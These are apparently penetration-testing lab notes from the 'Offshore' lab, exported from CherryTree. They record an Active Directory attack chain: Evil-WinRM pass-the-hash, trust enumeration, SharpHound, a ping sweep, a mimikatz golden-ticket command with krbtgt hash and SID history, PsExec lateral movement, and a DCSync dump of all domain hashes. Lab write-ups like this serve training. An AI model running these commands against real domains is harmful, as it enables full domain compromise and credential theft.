<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>DC02 - 172.16.2.6</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>DC02 - 172.16.2.6</h1><br/><p><a href="Offshore--DC02_-_172.16.2.6_21.html#OFS-Flag24">Flag 24</a></p><p><a href="Offshore--DC02_-_172.16.2.6_21.html#OFS-AdminOffshore-DAHash">Domain admin hash for admin.offshore.com</a></p><p></p><p>With the administrator hash we found on WS03 we can Evil-WinRM to DC02 and get the flag on the administrator desktop</p><p><a name="OFS-Flag24"></a>OFFSHORE{l@zy_adm1ns_ru1n_th3_p4rty}</p><p></p><p>Let&#39;s get the Domain Trusts from dev.admin.offshore.com to see where we need to proceed</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; Get-DomainTrust -Domain dev.admin.offshore.com </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SourceName      : dev.ADMIN.OFFSHORE.COM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TargetName      : ADMIN.OFFSHORE.COM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustAttributes : WITHIN_FOREST</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustDirection  : Bidirectional</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenCreated     : 5/31/2018 10:24:17 PM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenChanged     : 5/2/2023 7:10:18 AM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SourceName      : dev.ADMIN.OFFSHORE.COM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TargetName      : corp.local</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustAttributes : FILTER_SIDS</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">TrustDirection  : Bidirectional</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenCreated     : 6/9/2018 2:53:07 AM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WhenChanged     : 5/2/2023 7:09:49 AM</span></code></p><p></p><p>Get a Bloodhound dump</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; . .\SharpHound.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; Invoke-BloodHound -CollectionMethod All -Domain admin.offshore.com</span></code></p><p></p><p>Ping the domain to see the DC IP</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; ping admin.offshore.com</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Pinging admin.offshore.com [172.16.3.5] with 32 bytes of data:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Reply from 172.16.3.5: bytes=32 time&lt;1ms TTL=127</span></code></p><p></p><p>Pingsweep to find the hosts</p><p></p><p><code><span style="background-color:#000000;">└─$ cat pingsweep_admin.sh     </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">#!/bin/bash</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">for ip in 172.16.3.{1..254}; do</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  if ping -c 1 -W 1 &quot;$ip&quot; &gt;/dev/null; then</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    echo &quot;$ip&quot; &gt;&gt; admin.pingsweep.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  fi</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">done </span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ cat admin.pingsweep.txt </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.3.5</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.3.103</span></code></p><p></p><p>Let&#39;s try a golden ticket attack</p><p></p><p>For this attack we need</p><p>user: administrator</p><p>user sid: S-1-5-21-1416445593-394318334-2645530166 (get this with wmic useraccount get name,sid)</p><p>krbtgt&#39;s password hash: 9404def404bc198fd9830a3483869e78 </p><p>get this with Get-NetUser -Identity krbtgt -Domain dev.admin.offshore.com -server 172.16.3.5 | Select-Object ObjectGUID</p><p>objectguid                          </p><p>----------                          </p><p>72f120b4-414c-47e9-91a7-3be55b14ac29</p><p></p><p>sids: </p><p>PS C:\temp&gt; convertto-sid ADMIN\administrator</p><p>S-1-5-21-1216317506-3509444512-4230741538-500 (replace 500 with 519 for enterprise admins)</p><p></p><p><code><span style="background-color:#000000;">.\mimikatz.exe &quot;kerberos::golden /domain:dev.admin.offshore.com /user:Administrator /sid:S-1-5-21-1416445593-394318334-2645530166 /krbtgt:9404def404bc198fd9830a3483869e78 /sids:S-1-5-21-1216317506-3509444512-4230741538-519 /ptt&quot; &quot;exit&quot;</span></code></p><p></p><p><img src="images/21-1.png" alt="images/21-1.png" /></p><p></p><p>Open CMD.exe administratively</p><p>Use Psexec64.exe to get nt authority\system (psexec64.exe -i -s cmd.exe)</p><p>Use it again to lateral to DC03 (psexec64.exe -s -i \\dc03 cmd.exe)</p><p></p><p><img src="images/21-2.png" alt="images/21-2.png" /></p><p></p><p>Upload mimikatz and dump the hashes for admin.offshore.com</p><p></p><p><img src="images/21-3.png" alt="images/21-3.png" /></p><p></p><p><code><span style="background-color:#000000;">Using &#39;mimikatz.log&#39; for logfile : OK</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">mimikatz(commandline) # lsadump::dcsync /all /csv</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[DC] &#39;ADMIN.OFFSHORE.COM&#39; will be the domain</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[DC] &#39;DC03.ADMIN.OFFSHORE.COM&#39; will be the DC server</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[DC] Exporting domain &#39;ADMIN.OFFSHORE.COM&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[rpc] Service  : ldap</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">502	krbtgt	ea9112d4beb759907688c9e267eff246	514</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">1107	MS01$	db505645b78f70ae01dd6cebbe4b2b8b	4096</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">1000	DC03$	a309490aabcffeea561fb1d8b36607d0	532480</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">1108	WS04$	2abf50d13b5e08b92ac2d90c1d125b99	4096</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3101	DEV$	778f0b76a4c455a8a6b2beb8f6b9b2a9	2080</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3104	CLIENT$	138b107ad1069ee8884b6d55b0383177	2080</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-AdminOffshore-DAHash"></a><strong><span style="color:#ed333b;">500	Administrator	f2594c9e60abf7e28e7601db343a7e24	512</span></strong></p><p>13101	dumahgrind	6f59a2db73706c68b2c6c27391363a93	512</p><p>3113	bankvault	0ce1cb01ade331cdba32d0e1fba338a1	512</p><p></p><p>mimikatz(commandline) # exit</p><p>Bye!</p><p></p><p>Double check that our hash works</p><p></p><p><img src="images/21-4.png" alt="images/21-4.png" /></p><p></p></div>
</body>
</html>
